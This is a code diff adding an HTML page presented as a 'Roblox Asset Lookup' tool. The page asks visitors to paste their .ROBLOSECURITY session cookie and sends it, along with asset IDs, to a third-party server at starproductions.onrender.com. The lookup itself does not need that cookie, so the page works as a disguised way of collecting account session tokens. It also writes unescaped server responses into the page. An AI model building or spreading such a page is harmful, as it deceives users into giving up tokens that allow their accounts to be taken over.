@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Asset Lookup</title>
+    <style>
+        :root {
+            --bg-url: url('https://wallpapercave.com/wp/wp2757874.gif');
+            --logo-url: url('https://upload.wikimedia.org/wikipedia/commons/6/6c/Roblox_Logo_Black.svg');
+            --logo-height: 120px;
+        }
+
+        body {
+            font-family: Arial;
+            background: var(--bg-url) no-repeat center center fixed;
+            background-size: cover;
+            color: #eee;
+            padding: 20px;
+            backdrop-filter: blur(5px);
+        }
+
+        .glass {
+            background: rgba(0,0,0,0.35);
+            border: 1px solid rgba(255,255,255,0.2);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: rgba(0,0,0,0.4);
+            color: #eee;
+            border: 1px solid rgba(255,255,255,0.2);
+            backdrop-filter: blur(8px);
+            border-radius: 8px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background: #4a8;
+            border: none;
+            color: #000;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 8px;
+        }
+
+        h3 { margin-top: 30px; }
+
+        pre {
+            background: rgba(0,0,0,0.4);
+            padding: 10px;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 8px;
+            white-space: pre-wrap;
+        }
+
+        html {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .logo {
+            height: var(--logo-height);
+            background-image: var(--logo-url);
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            width: 100%;
+        }
+
+        .logo-animated {
+            animation-name: rgbhover;
+            animation-duration: 3s;
+            animation-iteration-count: infinite;
+            animation-timing-function: ease-in-out;
+        }
+
+        @keyframes rgbhover {
+            from { transform: translate(0, 0px); }
+            65% { transform: translate(0, 15px); }
+            to { transform: translate(0, -0px); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="logo logo-animated"></div>
+
+<h2>Roblox Asset Lookup</h2>
+
+<label>Asset IDs (comma separated):</label>
+<input id="assetIds" placeholder="133442266159229">
+
+<label>.ROBLOSECURITY Cookie (value only):</label>
+<input id="cookie" placeholder="paste cookie value here">
+
+<button onclick="lookup()">Lookup</button>
+
+<h3>Asset Info</h3>
+<div id="assetInfo" class="glass"></div>
+
+<h3>Creator Info</h3>
+<div id="creatorInfo" class="glass"></div>
+
+<script>
+async function lookup() {
+    const ids = document.getElementById("assetIds").value.trim();
+    const cookie = document.getElementById("cookie").value.trim();
+
+    const assetBox = document.getElementById("assetInfo");
+    const creatorBox = document.getElementById("creatorInfo");
+
+    assetBox.innerHTML = "Loading...";
+    creatorBox.innerHTML = "";
+
+    const backend = "https://starproductions.onrender.com";
+
+    try {
+        const res = await fetch(backend + "/asset", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ids, cookie })
+        });
+
+        const text = await res.text();
+
+        if (!res.ok) {
+            assetBox.innerHTML = `<pre>${text}</pre>`;
+            return;
+        }
+
+        const data = JSON.parse(text);
+
+        if (!data.data || !data.data[0]) {
+            assetBox.innerHTML = `<pre>${text}</pre>`;
+            return;
+        }
+
+        const asset = data.data[0];
+
+        assetBox.innerHTML = `
+            <div class="glass">Asset Name: ${asset.name}</div>
+            <div class="glass">Asset Type: ${asset.type}</div>
+            <div class="glass">Asset Moderated: ${asset.isModerated}</div>
+        `;
+
+        const creator = asset.creator;
+        const targetId = creator.targetId;
+
+        if (creator.type === "User") {
+            fetchUser(targetId);
+        } else if (creator.type === "Group") {
+            fetchGroup(targetId);
+        }
+
+    } catch (err) {
+        assetBox.innerHTML = `<pre>${err}</pre>`;
+    }
+}
+
+async function fetchUser(userId) {
+    const creatorBox = document.getElementById("creatorInfo");
+
+    try {
+        const res = await fetch(`https://starproductions.onrender.com/user/${userId}`);
+        const text = await res.text();
+
+        if (!res.ok) {
+            creatorBox.innerHTML = `<pre>${text}</pre>`;
+            return;
+        }
+
+        const user = JSON.parse(text);
+
+        creatorBox.innerHTML = `
+            <div class="glass">Username: ${user.name}</div>
+            <div class="glass">Display Name: ${user.displayName}</div>
+            <div class="glass">Verified: ${user.hasVerifiedBadge}</div>
+            <div class="glass">Banned: ${user.isBanned}</div>
+        `;
+    } catch (err) {
+        creatorBox.innerHTML = `<pre>${err}</pre>`;
+    }
+}
+
+async function fetchGroup(groupId) {
+    const creatorBox = document.getElementById("creatorInfo");
+
+    try {
+        const res = await fetch(`https://starproductions.onrender.com/group/${groupId}`);
+        const text = await res.text();
+
+        if (!res.ok) {
+            creatorBox.innerHTML = `<pre>${text}</pre>`;
+            return;
+        }
+
+        const group = JSON.parse(text);
+
+        creatorBox.innerHTML = `
+            <div class="glass">Group Name: ${group.name}</div>
+            <div class="glass">Group Verified: ${group.hasVerifiedBadge}</div>
+            <div class="glass">Owner Username: ${group.owner.username}</div>
+            <div class="glass">Owner Display Name: ${group.owner.displayName}</div>
+        `;
+    } catch (err) {
+        creatorBox.innerHTML = `<pre>${err}</pre>`;
+    }
+}
+</script>
+
+</body>
+</html>
